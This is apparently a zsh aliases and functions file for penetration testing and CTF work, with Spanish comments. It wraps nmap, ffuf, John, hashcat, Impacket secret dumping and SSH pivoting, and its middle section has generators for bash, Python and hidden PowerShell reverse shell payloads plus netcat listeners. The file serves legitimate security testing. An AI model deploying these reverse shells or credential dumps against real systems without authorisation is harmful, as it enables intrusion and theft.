# ------------------------------------------------------------------------------
# --- Professional Pentesting Aliases & Functions ---
# --- Optimized, Scalable, and Easy to Remember ---
# ------------------------------------------------------------------------------

# ==============================================================================
# --- Variables Globales (Centralizadas) ---
# ==============================================================================
# Cambia estas rutas según tu distribución. Si cambias de Kali a otra distro,
# solo modifica estas variables y no tendrás que tocar 20 aliases distintos.

export WLISTS="/usr/share/wordlists"
export ROCKYOU="$WLISTS/rockyou.txt"
export SECLISTS="$WLISTS/seclists"
export TARGET_FILE="/tmp/target_ip"  # Archivo temporal para persistencia entre terminales

# ==============================================================================
# --- Gestión de Objetivos (Target Management) ---
# ==============================================================================
# Sistema profesional que persiste el objetivo entre todas las terminales.
# Ejemplo: settarget 10.10.11.23 -> Abres nueva pestaña -> $RHOST ya está configurado

settarget() {
    if [ -z "$1" ]; then
        echo "Uso: settarget <IP>"
        return 1
    fi
    echo "$1" > "$TARGET_FILE"
    export RHOST="$1"
    export TARGET="$1"
    echo "[+] Target global establecido a: $1"
}

# Función para limpiar objetivo
cleartarget() {
    rm -f "$TARGET_FILE"
    unset RHOST
    unset TARGET
    echo "[+] Target eliminado"
}

# Mostrar objetivo actual
showtarget() {
    if [ -n "$RHOST" ]; then
        echo "[+] Current target: $RHOST"
    else
        echo "[-] No target set. Use 'settarget <IP>'"
    fi
}

# Cargar objetivo automáticamente al abrir nueva terminal
if [ -f "$TARGET_FILE" ]; then
    export RHOST=$(cat "$TARGET_FILE")
    export TARGET="$RHOST"
fi

# ==============================================================================
# --- Reconocimiento y Escaneo (Optimizado) ---
# ==============================================================================
# Funciones que organizan automáticamente la salida en carpetas.
# Un profesional no tira los resultados en la raíz.

# Escaneo TCP estándar con scripts y versiones
nscan() {
    [ -z "$RHOST" ] && echo "Error: RHOST no definido. Usa 'settarget <IP>'" && return 1
    mkdir -p nmap
    echo "[*] Escaneando $RHOST..."
    nmap -sC -sV -oN nmap/initial "$RHOST"
}

# Escaneo de TODOS los puertos TCP
nscan-all() {
    [ -z "$RHOST" ] && echo "Error: RHOST no definido." && return 1
    mkdir -p nmap
    echo "[*] Escaneando TODOS los puertos de $RHOST..."
    nmap -p- --min-rate 5000 -sV -oN nmap/all_ports "$RHOST"
}

# Escaneo UDP rápido (top 100 puertos)
nscan-udp() {
    [ -z "$RHOST" ] && echo "Error: RHOST no definido." && return 1
    mkdir -p nmap
    echo "[*] Escaneo UDP rápido..."
    sudo nmap -sU --top-ports 100 -oN nmap/udp_top "$RHOST"
}

# Escaneo de vulnerabilidades
nscan-vuln() {
    [ -z "$RHOST" ] && echo "Error: RHOST no definido." && return 1
    mkdir -p nmap
    echo "[*] Escaneo de vulnerabilidades en $RHOST..."
    nmap --script vuln -oN nmap/vuln "$RHOST"
}

# Escaneo rápido (top 1000 puertos)
nscan-quick() {
    [ -z "$RHOST" ] && echo "Error: RHOST no definido." && return 1
    mkdir -p nmap
    echo "[*] Escaneo rápido (top 1000 puertos)..."
    nmap -T4 -F -sV -oN nmap/quick "$RHOST"
}

# ==============================================================================
# --- Servidores y Transferencia de Archivos ---
# ==============================================================================

# Servidor HTTP en Python (Puerto 80 default o el que elijas)
www() {
    local port="${1:-80}"
    echo "[+] Sirviendo directorio actual en puerto $port"
    sudo python3 -m http.server "$port"
}

# Servidor HTTP en puerto no privilegiado (8000 por defecto)
serve() {
    local port="${1:-8000}"
    echo "[+] Sirviendo directorio actual en puerto $port"
    python3 -m http.server "$port"
}

# Servidor SMB rápido (Impacket) - Útil para Windows targets
smb-server() {
    local sharename="${1:-share}"
    echo "[+] Servidor SMB iniciado. Share: '$sharename', Path: $(pwd)"
    sudo impacket-smbserver "$sharename" $(pwd) -smb2support
}

# ==============================================================================
# --- Reverse Shells y Listeners (Mejorados) ---
# ==============================================================================

# Listener mejorado con rlwrap (instalar: sudo apt install rlwrap)
# rlwrap proporciona historial, navegación con flechas y edición de línea
alias listen='rlwrap -cAr nc -nlvp'

# Listener simple sin rlwrap (fallback si no está instalado)
alias listen-simple='nc -nlvp'

# Generador rápido de Reverse Shell Bash (Base64 para evitar badchars)
gen-rev() {
    [ -z "$1" ] && echo "Uso: gen-rev <IP> <PORT>" && return 1
    local ip=$1
    local port=$2
    echo "[+] Payload Bash (Base64):"
    local payload="bash -i >& /dev/tcp/$ip/$port 0>&1"
    local b64=$(echo -n "$payload" | base64 -w0)
    echo "echo $b64 | base64 -d | bash"
    echo "$b64" | xclip -sel clip 2>/dev/null && echo "[+] Base64 copiado al portapapeles" || echo "[!] xclip no disponible"
}

# Generador de Reverse Shell Python
gen-rev-python() {
    [ -z "$1" ] && echo "Uso: gen-rev-python <IP> <PORT>" && return 1
    local ip=$1
    local port=$2
    local payload="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'"
    echo "$payload" | xclip -sel clip 2>/dev/null && echo "[+] Payload copiado al portapapeles" || echo "[!] xclip no disponible"
    echo "$payload"
}

# Generador de Reverse Shell PowerShell
gen-rev-ps() {
    [ -z "$1" ] && echo "Uso: gen-rev-ps <IP> <PORT>" && return 1
    local ip=$1
    local port=$2
    local cmd="powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|{%{0}};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes, 0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
    echo "$cmd" | xclip -sel clip 2>/dev/null && echo "[+] Payload copiado al portapapeles" || echo "[!] xclip no disponible"
    echo "$cmd"
}

# ==============================================================================
# --- Tratamiento de TTY (Estabilización de Shell) ---
# ==============================================================================
# Una de las cosas más comunes y molestas es estabilizar una shell.
# Esta función imprime los comandos mágicos de Python.

fix-tty() {
    echo "=== Comandos para estabilizar TTY ==="
    echo ""
    echo "1. python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
    echo "   (o python -c 'import pty; pty.spawn(\"/bin/bash\")')"
    echo ""
    echo "2. Presiona: Ctrl + Z"
    echo ""
    echo "3. stty raw -echo; fg"
    echo ""
    echo "4. reset"
    echo ""
    echo "5. export TERM=xterm"
    echo ""
    echo "6. stty rows <NUM> cols <NUM>  (opcional: ajustar tamaño)"
}

# ==============================================================================
# --- Funciones de Fuzzing Modernas ---
# ==============================================================================

# Fuzzing de Directorios
fuzz-dir() {
    [ -z "$1" ] && echo "Uso: fuzz-dir <URL>" && return 1
    local wordlist="${2:-$SECLISTS/Discovery/Web-Content/directory-list-2.3-medium.txt}"
    echo "[*] Fuzzing directorios en $1"
    ffuf -u "$1/FUZZ" -w "$wordlist" -e .php,.txt,.html,.bak,.old -c -t 200
}

# Fuzzing de Subdominios (VHOST)
fuzz-vhost() {
    [ -z "$1" ] && echo "Uso: fuzz-vhost <URL> (ej: http://site.htb)" && return 1
    local wordlist="${2:-$SECLISTS/Discovery/DNS/subdomains-top1million-110000.txt}"
    echo "[*] Buscando vhosts en $1"
    ffuf -u "$1" -H "Host: FUZZ.$(echo $1 | sed 's|http://||' | sed 's|https://||' | cut -d'/' -f1)" -w "$wordlist" -mc 200 -fs 0 -c
}

# Fuzzing de parámetros
fuzz-params() {
    [ -z "$1" ] && echo "Uso: fuzz-params <URL> [WORDLIST]" && return 1
    local wordlist="${2:-$SECLISTS/Discovery/Web-Content/burp-parameter-names.txt}"
    echo "[*] Fuzzing parámetros en $1"
    ffuf -u "$1?FUZZ=test" -w "$wordlist" -c -t 200
}

# ==============================================================================
# --- Password Cracking ---
# ==============================================================================

# John the Ripper con rockyou
jtr() {
    [ -z "$1" ] && echo "Uso: jtr <HASH_FILE>" && return 1
    john --wordlist="$ROCKYOU" "$1"
}

# Mostrar hashes crackeados
alias jtr-show='john --show'

# Hashcat rápido
hashcat-quick() {
    [ -z "$3" ] && echo "Uso: hashcat-quick <MODE> <HASH_FILE> <WORDLIST>" && return 1
    hashcat -a 0 -m "$1" "$2" "$3"
}

# ==============================================================================
# --- Active Directory (Impacket) ---
# ==============================================================================

# Obtener usuarios sin pre-autenticación (AS-REP Roasting)
alias imp-getnpusers='impacket-getnpusers -request'

# Dump de secretos (solo NTLM)
alias imp-secrets='impacket-secretsdump -just-dc-ntlm'

# Dump completo de secretos
alias imp-secrets-full='impacket-secretsdump'

# ==============================================================================
# --- Networking & System Utilities ---
# ==============================================================================

# IP local
alias ip-local='ip -4 -br a'

# IP pública
alias ip-public='curl -s ifconfig.me; echo'

# IP de tun0 (VPN)
alias myip='ip -f inet addr show tun0 | grep -oP "(?<=inet\s)\d+(\.\d+){3}"'

# Copiar IP de tun0 al portapapeles
myvpnip() {
    IP=$(ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')
    if [ -z "$IP" ]; then
        echo "Error: tun0 interface not found or has no IP."
        return 1
    fi
    echo $IP | xclip -sel clip 2>/dev/null && echo "Copied: $IP" || echo "IP: $IP (xclip no disponible)"
}

# Editar /etc/hosts
alias hosts='sudo nano /etc/hosts'

# Agregar entrada a /etc/hosts
addhost() {
    if [ -n "$1" ] && [ -n "$2" ]; then
        echo "$1\t$2" | sudo tee -a /etc/hosts
        echo "[+] Added '$2' to /etc/hosts"
    else
        echo "Usage: addhost <IP> <HOSTNAME>"
    fi
}

# ==============================================================================
# --- Metasploit ---
# ==============================================================================

alias msf='msfconsole'

# ==============================================================================
# --- General Productivity ---
# ==============================================================================

# Listado de archivos
alias ls='ls --color=auto'
alias ll='ls -lAhF'
alias la='ls -A'
alias l='ls -CF'
alias lf='ls -alF'

# Navegación
alias ..='cd ..'
alias ...='cd ../..'
alias ....='cd ../../..'

# Búsqueda
alias grep='grep --color=auto'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'

# Utilidades
alias c='clear'
alias h='history'
alias hg='history | grep'

# ==============================================================================
# --- System Management ---
# ==============================================================================

alias update='sudo apt update && sudo apt full-upgrade -y'
alias install='sudo apt install -y'
alias remove='sudo apt remove -y'
alias search='apt-cache search'
alias autoremove='sudo apt autoremove -y'

# ==============================================================================
# --- Process Management ---
# ==============================================================================

alias top='htop'
alias psg="ps aux | grep -v grep | grep -i -e VSZ -e"

# ==============================================================================
# --- CTF Utilities ---
# ==============================================================================

# Crear estructura de directorios para CTF
ctf-setup() {
    local name="${1:-ctf_target}"
    mkdir -p "$name"/{recon,exploit,data,scripts,nmap,web}
    echo "[+] CTF structure created in $name/"
    echo "[+] Use 'settarget <IP>' to set target"
}

# Crear directorio y entrar
mkcd() {
    mkdir -p "$1"
    cd "$1"
}

# Listar y cambiar directorio
cl() {
    cd "$1" && ls -la
}

# ==============================================================================
# --- Binary Analysis ---
# ==============================================================================

# Información rápida de binario
bininfo() {
    [ ! -f "$1" ] && echo "File not found: $1" && return 1
    echo "=== File Info ==="
    file "$1"
    echo ""
    echo "=== Strings (first 20) ==="
    strings "$1" | head -20
    echo ""
    echo "=== Linked Libraries (ldd) ==="
    ldd "$1" 2>/dev/null || echo "Not an ELF executable or ldd failed."
}

# Extraer strings relevantes
extract-strings() {
    for file in "$@"; do
        echo "[*] Strings from $file:"
        strings "$file" | grep -E -i "flag|password|key|secret|admin"
    done
}

# ==============================================================================
# --- Pivoting & Tunneling ---
# ==============================================================================

# SOCKS proxy via SSH
socks-proxy() {
    [ -z "$2" ] && echo "Usage: socks-proxy <USER@HOST> <PORT>" && return 1
    echo "[+] Setting up SOCKS proxy via $1 on local port $2"
    ssh -D $2 -N -f "$1"
    echo "[+] Proxy running on 127.0.0.1:$2. Use with proxychains."
}

# Port forwarding via SSH
fwport() {
    [ -z "$4" ] && echo "Usage: fwport <REMOTE_IP> <REMOTE_PORT> <LOCAL_PORT> <SSH_TARGET>" && return 1
    echo "[+] Forwarding remote port $1:$2 to local port $3 via $4"
    ssh -L "$3:$1:$2" "$4" -N -f
    echo "[+] Port forwarding active."
}

# ==============================================================================
# --- Rustscan ---
# ==============================================================================

alias rs-full='rustscan -a'

# ==============================================================================
# --- VPN ---
# ==============================================================================

vpn() {
    sudo openvpn "$@"
}

# ==============================================================================
# --- Reload Configuration ---
# ==============================================================================

alias reload='source ~/.zshrc'
alias actzs='source ~/.zshrc'

# ==============================================================================
# --- End of Configuration ---
# ==============================================================================
